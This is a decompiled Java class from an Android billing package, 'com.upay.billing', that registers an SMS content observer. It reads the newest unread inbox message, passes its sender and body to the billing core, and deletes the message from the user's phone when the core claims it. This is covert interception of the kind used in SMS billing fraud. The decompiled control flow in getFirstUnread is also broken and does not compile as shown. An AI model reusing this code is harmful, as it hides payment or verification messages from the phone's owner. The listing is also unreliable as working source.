package com.upay.billing.engine;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import com.upay.billing.UpayCore;
import com.upay.billing.utils.Util;

public class SmsObserver
  extends ContentObserver
{
  private static final String TAG = "SmsObserver";
  private Context mContext;
  
  public SmsObserver(Handler paramHandler, Context paramContext)
  {
    super(paramHandler);
    this.mContext = paramContext;
    Log.i("SmsObserver", "SmsObserver---start");
  }
  
  public String[] getFirstUnread()
  {
    Cursor localCursor = this.mContext.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[] { "_id", "address", "body", "date", "read" }, "read = ?", new String[] { "0" }, " date desc limit 1");
    String str1;
    String str2;
    String str3;
    if ((localCursor != null) && (localCursor.moveToNext()))
    {
      str1 = localCursor.getString(0);
      str2 = localCursor.getString(1);
      str3 = localCursor.getString(2);
    }
    for (;;)
    {
      if (localCursor != null) {
        localCursor.close();
      }
      return new String[] { str1, str2, str3 };
      str3 = "";
      str2 = "";
      str1 = "";
    }
  }
  
  public void onChange(boolean paramBoolean)
  {
    Log.i("SmsObserver", "SmsObserver---onChange");
    try
    {
      Object localObject = getFirstUnread();
      String str1 = localObject[0];
      String str2 = localObject[1];
      localObject = localObject[2];
      if (!Util.empty(str1))
      {
        if (Util.empty(str2)) {
          return;
        }
        if (UpayCore.getInstance(this.mContext).smsReceived(str2, (String)localObject, 2))
        {
          this.mContext.getContentResolver().delete(Uri.parse("content://sms/" + str1), null, null);
          return;
        }
      }
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
}
